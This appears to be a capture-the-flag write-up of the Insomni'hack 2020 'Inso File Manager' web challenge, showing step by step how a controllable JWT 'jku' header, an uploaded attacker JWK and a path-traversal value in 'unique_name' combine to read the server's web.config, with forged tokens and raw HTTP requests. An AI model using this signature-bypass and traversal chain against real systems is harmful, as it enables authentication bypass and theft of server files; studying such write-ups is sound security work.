---
title: "Insomni'hack teaser 2020 - Inso File Manager 1 (Web)"
date: 2020-01-21T13:37:00+01:00
author: "SlaxXx"
description: "Challenge writeup: 'filemanager 1'@Insomnia'hack teaser 2020"
---
***TL;DR***
Dont trust user suppplied data, don´t screw up your jwt validation.

# Understanding the application
The Ino Filemanager lets us, after registration, upload files and make them publicly available. 

After registering a user and logging in, we observed that we were issued a JSON Web Token (*JWT*).
The JWT will be stored in the local storage of the used browser and it will be transmitted with every request to the server.

```
{"Id":0,"Guid":"69a96f63-cc31-4a42-bcf8-03b3e9705428","Username":"SlaxXx","Password":null,"Token":"eyJhbGciOiJSUzI1NiIsImtpZCI6Imluc28yMCIsInR5cCI6IkpXVCIsImprdSI6Imh0dHBzOi8vZmlsZW1hbmFnZXIuaW5zb21uaWhhY2suY2gvandrLmpzb24ifQ.eyJ1bmlxdWVfbmFtZSI6IjY5YTk2ZjYzLWNjMzEtNGE0Mi1iY2Y4LTAzYjNlOTcwNTQyOCIsInJvbGUiOiJVc2VyIiwibmJmIjoxNTc5NjQ3MjQwLCJleHAiOjE1ODAyNTIwNDAsImlhdCI6MTU3OTY0NzI0MH0.aqEGHdNOaw-qcToTQkqdTvws2boYydo7wZVYJPWzjcvbEzWslsHUlyBD2yHdPj3iyPfc2p3KpTDfCRMRNoTjSyx7n6s-2N143fZ22EuD7kaSgGOuFbqs3SD0_Ot7LzVcwYJfVCUFiFC5Xw4gcwnuSraCp9x0gNtdEJCzDN5weMvH1qy6bBnm3wGDvfWBxXqho2hAqO5bOAqyBf_jZK0JKUvchQ62jEKMjcK97qBSfEY_RTAwVJYHvyspajvfbep9RWnW0rOqX22FsxHp0uJfK9WUiQFYGMl9Fal3I49qD4Cd42sLZ3ncD0IFepKDSxb5gGhf5fa3ZfPOmwOKTbKsPw","Role":"User"}
```
We decoded the JWT with the help of [jwt.io](https://jwt.io).
For more informations about JSON Web Tokens visit [JWT introduction](https://jwt.io/introduction/) or the offical [RFC](https://tools.ietf.org/html/rfc7519#section-4.1.4).
The decoded parts are as follows:

## Header
```
{
  "alg": "RS256",
  "kid": "inso20",
  "typ": "JWT",
  "jku": "https://filemanager.insomnihack.ch/jwk.json"
}
```
``"alg": "RS256"``: The algorithm used to sign the JWT is RSA256. The token is signed by a private key and validated against the corresponding public key.  

``"kid": "inso20"``: The id of the used key is *inso20*. 

``"typ": "JWT"``: This is a JSON Web Token... duh... 

``"jku": "https://filemanager.insomnihack.ch/jwk.json"``: The public key to validate the token signature can be found at *https://filemanager.insomnihack.ch/jwk.json*

## Payload
```
{
  "unique_name": "69a96f63-cc31-4a42-bcf8-03b3e9705428",
  "role": "User",
  "nbf": 1579647240,
  "exp": 1580252040,
  "iat": 1579647240
}
```
``"unique_name": "69a96f63-cc31-4a42-bcf8-03b3e9705428"``: This seems to be a unique id generated for the registered user by the application. This will 

``"role": "User"``: A role assigned to the registered user. 

``"nbf": 1579647240``: The *nbf* (not before) claim identifies the time before which the JWT MUST NOT be accepted for processing. 

``"exp": 1580252040``: The *exp* (expiration time) claim identifies the expiration time on or after which the JWT MUST NOT be accepted for processing

## Signature
From the header section, we now know that the algorithm used to sign the JWT is RSA256 and the public certificate to validate the signature can be found at *https://filemanager.insomnihack.ch/jwk.json*.

Accessing the public reveals, that indeed the ``kid`` id is *inso20*. 

```
{
  "kty": "RSA",
  "e": "AQAB",
  "alg": "RS256",
  "kid": "inso20",
  "n": "kE2FzXws8q2GnkNaQsQBIcSe0zZsxRe35V5rCXJRX9A1J5NCHoZiJS4LFDJW3n7Z5yNdntCKk9L7wYkOAxNiqPQHWuIk4Nyg3ZViZJLbO0fyx3eq-FSYhcfIePzD9Uz1ZgjBwavUi3ya8WoMv5ffG89OeTiVy7E1M-f7ykm205Nl11wrWXyyIWiyhchTl5baZzf3xLy-zn1s9yC2z13XOst-5pde4kfntIadYcdg9__VpYo6-k5sdpTlK7jPpKfUhfmRudgdf8Q37vLT5WlGFt-zh_D_QcNqc0heb4dhwgpgaqu-NJ7n6MJn6TDXes2qb-aLDFpwlJv9qULy7UdEDw"
}
```
We also see that the public key is in the JSON Web Key (JWK) format, informations regarding the JWK can be found in the offical [RFC](https://tools.ietf.org/html/rfc7517). 

The file manager of course also has an upload function.
![upload](/img/upload.jpg)
The upload will result in the http request below
```
POST /api/Files/Upload HTTP/1.1
Host: filemanager.insomnihack.ch
Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Imluc28yMCIsInR5cCI6IkpXVCIsImprdSI6Imh0dHBzOi8vZmlsZW1hbmFnZXIuaW5zb21uaWhhY2suY2gvandrLmpzb24ifQ.eyJ1bmlxdWVfbmFtZSI6IjA4ZWZmMTdhLWNkOWYtNGVhZC04MjcxLTc3Y2VhN2QxZWM1YyIsInJvbGUiOiJVc2VyIiwibmJmIjoxNTc5NjQ5NzkzLCJleHAiOjE1ODAyNTQ1OTMsImlhdCI6MTU3OTY0OTc5M30.ZpZ8UX_UmW7_w4RgGIzIc2FiXtKdDPo-kUO-prQNnar_qRl1McIsbhV4lAvVSl7Fp48WXDdaMn7uqStFDAUQUo3psZX4mvoQ2tIxT7ealcbHQHg3HaM04Na6zaH-qFtlNRR5C1SryMdDiiZ-HECiA2dd87aDv3qDYFkw1h16AkO8I83CYkIuHoDWa6O8VQi8QB-3uqefZMNTnb9-NiYGmYqdsea_2wgP2lFEFp15eyqQy825Bw1QJK3nTJx1DlwZPF5ayzFnWOD2ADpkXH5ybT4Xi5lxXz7g_LoWCn_bg85vuXG05eDMWerU38j3pW9VBuVmyiWuU0PBJeLSbCJodg
Content-Type: application/json;charset=utf-8
...SNIP...

{"filename":"Sharkzwithlazers.pizza","content":"eW9sb1Bpenph"}
```
The previously received token is now transferred in the ``Authorization`` Header.
Filename and base64 encoded file content are transmitted in the json request body.
Once transmitted the server responses with a generated unique id.
```
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
...SNIP...

"7db3bf68-f007-445c-8f42-c3802ec39738"
```
Once uploaded we can click on the uploaded file to get the stored content, see screenshot below.
![getContent](/img/getContent.jpg)
The click resultet in the http request below 
```
GET /api/Files/GetFile/7db3bf68-f007-445c-8f42-c3802ec39738 HTTP/1.1
Host: filemanager.insomnihack.ch
Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Imluc28yMCIsInR5cCI6IkpXVCIsImprdSI6Imh0dHBzOi8vZmlsZW1hbmFnZXIuaW5zb21uaWhhY2suY2gvandrLmpzb24ifQ.eyJ1bmlxdWVfbmFtZSI6IjA4ZWZmMTdhLWNkOWYtNGVhZC04MjcxLTc3Y2VhN2QxZWM1YyIsInJvbGUiOiJVc2VyIiwibmJmIjoxNTc5NjQ5NzkzLCJleHAiOjE1ODAyNTQ1OTMsImlhdCI6MTU3OTY0OTc5M30.ZpZ8UX_UmW7_w4RgGIzIc2FiXtKdDPo-kUO-prQNnar_qRl1McIsbhV4lAvVSl7Fp48WXDdaMn7uqStFDAUQUo3psZX4mvoQ2tIxT7ealcbHQHg3HaM04Na6zaH-qFtlNRR5C1SryMdDiiZ-HECiA2dd87aDv3qDYFkw1h16AkO8I83CYkIuHoDWa6O8VQi8QB-3uqefZMNTnb9-NiYGmYqdsea_2wgP2lFEFp15eyqQy825Bw1QJK3nTJx1DlwZPF5ayzFnWOD2ADpkXH5ybT4Xi5lxXz7g_LoWCn_bg85vuXG05eDMWerU38j3pW9VBuVmyiWuU0PBJeLSbCJodg
...SNIP...

```
The previously received id ``7db3bf68-f007-445c-8f42-c3802ec39738`` is now used to access the file content.

Besides uploading and viewing files it is also possible to make files publicly available.
After ticking the *public* checkbox a publicly available url is generated where everyone can access the uploaded file.
![set public](/img/public.jpg)
If we disect the public url `.../api/files/public/7db3bf68-f007-445c-8f42-c3802ec39738/08eff17a-cd9f-4ead-8271-77cea7d1ec5c` we can see that the first dynamic part `7db3bf68-f007-445c-8f42-c3802ec39738` is the generated file id and the second is the `"unique_name": "69a96f63-cc31-4a42-bcf8-03b3e9705428"` from our JWT.



Enough talking let`s get hacking.

# Exploit
![letsGo](/img/letsgo.png)

First, we noticed, that we can control the `jku` from the JWT.
If we entered another url, for example https://sharkzwithlazers.pizza the request will hang for a significant amount of time until it fails.
However we didn´t receive an http request on our server, our guess was that external communication was not possible.
But since we are able to publish files on the filemanager itself we can simply upload a JWK file there and publish it.
To create such a JWK file we used [jwt.io](https://jwt.io/) to create a *RS256* signet JWT token.  
The site autogenerates private and public key for the created JWT.
The public key must be converted from the PEM format used by jwt.io to JWK format.
This is done by using [this site](https://irrte.ch/jwt-js-decode/pem2jwk.html). 
To make the key id of the server and the JWT match, we had to add the keyid to the JWK.
The generated JWK can be seen below and also downloaded [here](/docs/sharkz.jwk):
```
{
    "kty": "RSA",
    "kid": "inso20",
    "n": "nzyis1ZjfNB0bBgKFMSvvkTtwlvBsaJq7S5wA-kzeVOVpVWwkWdVha4s38XM_pa_yr47av7-z3VTmvDRyAHcaT92whREFpLv9cj5lTeJSibyr_Mrm_YtjCZVWgaOYIhwrXwKLqPr_11inWsAkfIytvHWTxZYEcXLgAXFuUuaS3uF9gEiNQwzGTU1v0FqkqTBr4B8nW3HCN47XUu0t8Y0e-lf4s4OxQawWD79J9_5d3Ry0vbV3Am1FtGJiJvOwRsIfVChDpYStTcHTCMqtvWbV6L11BWkpzGXSW4Hv43qa-GSYOD2QU68Mb59oSk2OB-BtOLpJofmbGEGgvmwyCI9Mw",
    "e": "AQAB"
}
```
Next we saved the created JWK to a file and uploaded it to the filemanager and used the publish funtion to make it publicly available.
Once uploaded we changed ``jku`` to point to our uploaded JWK.
```
{
  "alg": "RS256",
  "kid": "inso20",
  "typ": "JWT",
  "jku": "https://filemanager.insomnihack.ch/api/files/public/d8715758-9adb-4d3b-8015-e4029ba43e7f/79a3696b-97f6-4132-9f82-ca1f42f34ff2"
}
```
Since the server is now checking the JWT against our JWK we can change it to our liking and sign it using the known private key.
We have done this using jwt.io, see screenshot below.
![jwtToken](/img/jwtio.jpg)
This means we can send any ``unique_name`` inside the JWT and the server will accept it. As far as we know, the ``unique_name`` is part of the file structure and will probably be the folder where our user's files are stored.
Next we tried accessing the *web.config* by issuing the below *GetFile* request.
We created a token where the ``unique_name``  is set to ``..\\..\\..\\..\\inetpub\\wwwroot`` and the requested file to ``web.config``.
```
GET /api/Files/GetFile/web.config HTTP/1.1
Host: filemanager.insomnihack.ch
Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Imluc28yMCIsInR5cCI6IkpXVCIsImprdSI6Imh0dHBzOi8vZmlsZW1hbmFnZXIuaW5zb21uaWhhY2suY2gvYXBpL2ZpbGVzL3B1YmxpYy9kODcxNTc1OC05YWRiLTRkM2ItODAxNS1lNDAyOWJhNDNlN2YvNzlhMzY5NmItOTdmNi00MTMyLTlmODItY2ExZjQyZjM0ZmYyIn0.eyJ1bmlxdWVfbmFtZSI6Ii4uXFwuLlxcLi5cXC4uXFxpbmV0cHViXFx3d3dyb290Iiwicm9sZSI6IlVzZXIiLCJuYmYiOjE1Nzk2NDcyNDAsImV4cCI6MTU4MDI1MjA0MCwiaWF0IjoxNTc5NjQ3MjQwfQ.bxV1lHqgleVRCNH9XqEWKehR3ffI5gA3Woi3T4Dheihwfw3dRx6Ge_ewfdhRZJSHnxt4l9QEJiZqiEEz_dxlsJlePg1cdypX5bJdvxfvmvqo2LGlfFRkZr26CIdTZf4NWB4PJkPb82GcVLghh-_ugNxIxRTSp2oVKWiIoBLQJgEp27bjW-ZYMzXuV0QDmq5vQRKcwwVH5l2z0s7uHNCzSMye3B6D59Wb377RQEvWaEpfVgVAwffV6igXWjluQJFEcEd_3yv60bPMRiLykZB9LpUxqugAih3huuCZRfRsGvzTkVrST0sFJd0b5scQxRah9zduM3U7BfXov89TiP42jg
...SNIP...

```
With this request we were able to read the *web.config* which contained the flag.
Unfortunately I forgot to take screenshots or store the requests of the response so I´m not able to show you that it worked. \*sad face intensivies\*